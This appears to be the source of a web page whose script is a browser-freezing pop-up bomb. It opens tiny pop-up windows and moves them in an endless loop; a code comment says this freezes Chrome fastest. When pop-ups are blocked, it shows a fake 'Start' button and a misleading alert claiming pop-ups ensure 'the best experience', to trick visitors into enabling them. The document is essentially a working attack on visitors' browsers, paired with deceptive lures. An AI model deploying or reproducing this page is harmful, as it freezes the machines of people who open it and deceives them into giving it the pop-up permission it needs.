		#modalContainer {
			background-color:rgba(0, 0, 0, 0.3);
			position:absolute;
			top:0;
			width:100%;
			height:100%;
			left:0px;
			z-index:10000;
			background-image:url(tp.png); /* required by MSIE to prevent actions on lower z-index elements */
		}

		#alertBox {
			position:relative;
			width:33%;
			min-height:100px;
			max-height:400px;
			margin-top:50px;
			border:1px solid #fff;
			background-color:#fff;
			background-repeat:no-repeat;
			top:30%;
		}

		#modalContainer > #alertBox {
			position:fixed;
		}

		#alertBox h1 {
			margin:0;
			font:bold 1em Raleway,arial;
			background-color:#333333;
			color:#FFF;
			border-bottom:1px solid #333333;
			padding:10px 0 10px 5px;
		}

		#alertBox p {
			height:50px;
			padding-left:5px;
		padding-top:30px;
		text-align:center;
		vertical-align:middle;
		}

		#alertBox #closeBtn {
			display:block;
			position:relative;
			margin:10px auto 10px auto;
			padding:7px;
			border:0 none;
			width:70px;
			text-transform:uppercase;
			text-align:center;
			color:#FFF;
			background-color:#333333;
			border-radius: 0px;
			text-decoration:none;
			outline:0!important;
		}

		body {
			font-family: 'HelveticaNeue';
			background-color: #e6e6e6;
		}

		.title {
			position: absolute;
			top: 10%;
			left: 50%;
			-moz-transform: translateX(-50%) translateY(-10%);
			-webkit-transform: translateX(-50%) translateY(-10%);
			transform: translateX(-50%) translateY(-10%);
			border-radius: 25px;
			color: #333333;
			padding-left: 40px;
			padding-right: 40px;
			font-size: 25px;
		}

		.button {
			position: absolute;
			top: 50%;
			left: 50%;
			-moz-transform: translateX(-50%) translateY(-50%);
			-webkit-transform: translateX(-50%) translateY(-50%);
			transform: translateX(-50%) translateY(-50%);
			border-radius: 25px;
			background-color: #bfbfbf;
			color: #333333;
			padding-left: 40px;
			padding-right: 40px;
			cursor: pointer;
			font-size: 25px;
		}




		</style>
	</head>
	<body>
		<script>
			function randomString(length) {
				var result           = '';
				var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
				var charactersLength = characters.length;
				for ( var i = 0; i < length; i++ ) {
					result += characters.charAt(Math.floor(Math.random() * charactersLength));
				}
				return result;
			}

			function randomNumber(min, max) {
				return Math.floor(Math.random() * (max - min + 1) ) + min;
			}

			/*
			while(true) {
				newWindow();
			}
			*/
			newWindow(true);

			function newWindow(addText = false) {
				var win = window.open(window.location.href, randomString(randomNumber(5, 20)), "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=1,height=1,top=0,left=0");
				if(!win || win.closed || typeof win.closed=='undefined') 
				{ 
					if(addText) {
						document.write(`
						<div class="title">
							<h1>Click the start button below to begin!</h1>
						</div>
						<div class="button" onclick="alertEnablePopups()">
							<h1>Start</h1>
						</div>
					`)
					}
					setTimeout(function(){
						newWindow(false);
					}, 100);
				} else {
					while(true) { // it's better to constantly "move" the pop-ups (moving in quotes because they don't seem to move) than to constantly call new window because moving the popups really fast seems to freeze chromer the fastest
						win.moveTo(randomNumber(0, screen.width), randomNumber(0, screen.height));
						if(!win || win.closed || typeof win.closed=='undefined') 
						{
							newWindow(false);
						}
					}				
				}
			}

			function alertEnablePopups() {
				alert("<strong>We use pop-ups to ensure you have the best experience on our platform, please enable them and try again.</strong>");
			}

			var ALERT_TITLE = "Please enable pop-ups to continue.";
			var ALERT_BUTTON_TEXT = "OK";

			if(document.getElementById) {
				window.alert = function(txt) {
					createCustomAlert(txt);
				}
			}

			function createCustomAlert(txt) {
				d = document;

				if(d.getElementById("modalContainer")) return;

				mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
				mObj.id = "modalContainer";
				mObj.style.height = d.documentElement.scrollHeight + "px";
				
				alertObj = mObj.appendChild(d.createElement("div"));
				alertObj.id = "alertBox";
				if(d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
				alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth)/2 + "px";
				alertObj.style.visiblity="visible";

				h1 = alertObj.appendChild(d.createElement("h1"));
				h1.appendChild(d.createTextNode(ALERT_TITLE));

				msg = alertObj.appendChild(d.createElement("p"));
				//msg.appendChild(d.createTextNode(txt));
				msg.innerHTML = txt;

				btn = alertObj.appendChild(d.createElement("a"));
				btn.id = "closeBtn";
				btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
				btn.href = "#";
				btn.focus();
				btn.onclick = function() { removeCustomAlert();return false; }

				alertObj.style.display = "block";
				
			}

			function removeCustomAlert() {
				document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
			}
		</script>
	</body>
</html>
